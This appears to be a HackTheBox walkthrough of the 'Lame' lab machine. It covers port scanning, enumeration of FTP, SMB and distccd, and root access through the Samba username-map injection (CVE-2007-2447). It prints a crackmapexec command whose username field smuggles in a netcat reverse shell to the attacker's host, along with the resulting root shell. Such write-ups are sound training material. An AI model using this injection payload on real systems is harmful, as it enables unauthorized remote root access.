---
title: HTB | Lame
author: Zeropio
date: 2022-12-23
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/lame
---

![HTB Img](/assets/img/hackthebox/card/Lame.png)

# Fingerprint

## Scan
With the scan we can get the following open ports:
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### FTP
A critical [CVE](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) associated with this version can be found. Also, the **anonymous** login is enable:
```console
$ ftp anonymous@10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Everything can be download with the following command:
```bash
wget -m --no-passive ftp://anonymous@10.10.10.3
```

The FTP server seems to be empty.


### SSH
This version of SSH is vulnerable to an enumeration of user:password. But the server only allow RSA key login.

### SMB
A severe [CVE](https://www.cvedetails.com/cve/CVE-2012-1182/) is found for this one. Searching for it doesn't give any success. We downloaded the [nse file](https://svn.nmap.org/nmap/scripts/samba-vuln-cve-2012-1182.nse) and tried it:
```bash
nmap -p445 --script samba-vuln-cve-2012-1182.nse -Pn 10.10.10.3
nmap -p139 --script samba-vuln-cve-2012-1182.nse -Pn 10.10.10.3
```

But the allowed folders can be enumerated:
```console
$ smbclient -N -L \\\\10.10.10.3\\  
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
        ```

### distccd
On the other hand, searching for this vulnerability came to many payloads. Running the following [nse](https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse) against the target show it is vulnerable:
```console
$ nmap -p3632 --script distcc-cve2004-2687.nse -Pn 10.10.10.3

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
```


 
---

# Footprint

## Initial Access
The SMB server can be access without credentials:
```bash
smbclient -N \\\\10.10.10.3\\tmp
```

We know that is a vulnerable version, for example this [CVE](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). We found a exploit for metasploit, where refers to a username injection like:
```
username = "/=`nohup " + payload.encoded + "`"
```

We can try this by ourselves.

## Privilege Escalation
With CrackMapExec we can send logins attemps. Openning a netcat listener and sending the following command:
```bash
crackmapexec smb 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.3 80`' -p ''
```

Will give us the root reverse shell:
```console
$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.3] 40648
whoami
root
```
